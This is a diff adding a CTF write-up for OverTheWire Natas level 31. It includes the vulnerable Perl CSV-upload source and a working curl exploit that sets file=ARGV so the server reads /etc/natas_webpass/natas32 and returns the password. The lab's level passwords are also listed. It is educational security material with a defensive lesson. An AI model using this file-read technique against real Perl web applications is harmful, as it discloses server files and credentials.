@@ -3778,6 +3778,112 @@ Don't rely on `quote()` alone to prevent SQL injection, because unexpected input
 - **Date**: 2026-04-30 (solved, not documented)
 - **URL**: `http://natas31.natas.labs.overthewire.org`
 - **Password**: `m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y`
+- **Tools**: Web Browser, `curl`, `Perl`, `CSV`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<h1>natas31</h1>
+<div id="content">
+
+<form action="index.pl" method="post" enctype="multipart/form-data">
+    <h2> CSV2HTML</h2>
+    <br>
+    We all like .csv files.<br>
+    But isn't a nicely rendered and sortable table much cooler?<br>
+    <br>
+    Select file to upload:
+    <span class="btn btn-default btn-file">
+        Browse <input type="file" name="file">
+    </span>
+    <input type="submit" value="Upload" name="submit" class="btn">
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's view the source code!
+```perl
+END
+
+my $cgi = CGI->new;
+if ($cgi->upload('file')) {
+    my $file = $cgi->param('file');
+    print '<table class="sortable table table-hover table-striped">';
+    $i=0;
+    while (<$file>) {
+        my @elements=split /,/, $_;
+
+        if($i==0){ # header
+            print "<tr>";
+            foreach(@elements){
+                print "<th>".$cgi->escapeHTML($_)."</th>";
+            }
+            print "</tr>";
+        }
+        else{ # table content
+            print "<tr>";
+            foreach(@elements){
+                print "<td>".$cgi->escapeHTML($_)."</td>";
+            }
+            print "</tr>";
+        }
+        $i+=1;
+    }
+    print '</table>';
+}
+else{
+print <<END;
+```
+
+Notice `while (<$file>)`.
+
+This uses `Perl`’s diamond operator (`<>`). If the value is not a filehandle, `Perl` treats it as a filename.
+A special case is `ARGV`, which activates `Perl`’s argument-based input mode and switches reading to `@ARGV`.
+
+By setting `file=ARGV`, we force `Perl` to read from `@ARGV` instead of the uploaded CSV stream.
+
+To control what gets read via `@ARGV`, we prepare a spoof CSV file:
+```powershell
+echo "1,2,`n3,4," > test.csv
+```
+
+We then upload it with `file=ARGV`:
+```powershell
+curl.exe `
+  -u "natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y" `
+  -X POST `
+  -F "file=ARGV" `
+  -F "file=@test.csv" `
+  "http://natas31.natas.labs.overthewire.org/?/etc/natas_webpass/natas32"
+```
+
+The second `file=@test.csv` is only needed to satisfy the upload requirement.
+Once `file=ARGV` is processed, `Perl` switches input source away from the uploaded CSV stream.
+
+Output:
+```html
+<h1>natas31</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
+</th></tr></table>
+```
+
+The output appears in the table because fields from `@ARGV` are printed directly as HTML without changing the parsing logic.
+
+And the password for natas32 is `NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`.
+
+#### The Lesson
+
+Don't let user input control file **input sources**, as it can lead to information disclosure.
+
+### Level 32
+
+- **Date**: 2026-04-30 (solved, not documented)
+- **URL**: `http://natas32.natas.labs.overthewire.org`
+- **Password**: `NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`
 - **Tools**: Web Browser
 
 #### The Solution
